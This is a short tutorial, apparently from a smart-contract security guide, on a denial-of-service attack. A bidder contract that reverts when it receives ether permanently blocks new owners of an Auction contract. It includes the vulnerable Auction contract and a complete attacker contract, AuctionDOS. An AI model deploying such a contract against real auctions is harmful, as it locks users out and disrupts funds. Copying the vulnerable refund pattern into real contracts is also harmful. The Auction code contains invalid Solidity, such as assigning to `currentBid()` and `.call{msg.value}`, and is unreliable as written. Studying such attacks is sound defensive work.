# ⏪ External Call Reverts DoS

External calls can cause the contract to be vulnerable to DoS attacks. To better explain how can this be possible, consider the following simplified Auction contract:
```solidity
contract Auction {

  address public currentOwner;
  uint public currentBid();

  constructor() payable {
    currentOwner = msg.sender;
    currentBid() = msg.value;
  }

  receive() external payable {
    require(msg.value > currentBid());
    payable(currentOwner).call{msg.value}("");
    currentOwner = msg.sender;
    currentBid() = msg.value;
  }
}
```

For anyone to be a new owner of the Auction, he needs to send an amount of ether greater than the current price (which is set by the `currentOwner`).<br />
To prevent someone else from being a new owner (even if he has more ether than the current price), we can perform a DOS attack into the contract by creating a malicious contract that we register as the `currentOwner` (by sending ether greater than the current price of course) and reverts the transaction whenever it receives ether. So, when a new owner attempts to be a new owner (the `currentOwner` is our malicious contract), the transaction will revert, hence the `newOwner` will not be set anymore.<br />
Below is an example of a Malicious contract that can perform a DOS attack on the Auction contract:

```solidity
contract AuctionDOS {

    constructor(address payable _auction) payable {
        uint currentBid = Auction(_auction).currentBid();
        require(msg.value > currentBid, "You need to send more ether to be the currentOwner");

        // we register the contract as the currentOwner
        (bool success,) = _auction.call{value: msg.value}("");
        
        require(success, "Failed to register as currentOwner");
    }

    receive() external payable {
        // the contract will revert the transaction whenever there is an attempt to change the currentOwner
        revert("newOwner can not be set anymore x)");
    }
}
```